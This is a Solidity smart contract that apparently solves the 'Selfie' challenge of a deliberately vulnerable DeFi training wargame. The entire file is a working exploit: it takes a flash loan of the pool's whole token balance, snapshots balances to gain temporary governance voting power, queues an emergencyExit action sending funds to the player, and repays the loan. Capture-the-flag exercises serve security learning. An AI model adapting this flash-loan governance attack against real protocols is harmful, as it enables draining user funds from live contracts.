// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { SelfiePool } from "../../06_selfie/SelfiePool.sol";
import { SimpleGovernance } from "../../06_selfie/SimpleGovernance.sol";
import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { DamnValuableTokenSnapshot } from "../../DamnValuableTokenSnapshot.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool public flashPool;
    SimpleGovernance public governance;
    address public player;
    uint256 public actionId;

    function attack(SelfiePool flashPool_, SimpleGovernance governance_, address player_) external {
        flashPool = flashPool_;
        governance = governance_;
        player = player_;

        flashPool_.flashLoan(this, address(flashPool.TOKEN()), flashPool_.maxFlashLoan(address(flashPool.TOKEN())), "");
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        actionId = governance.queueAction(address(flashPool), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(flashPool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
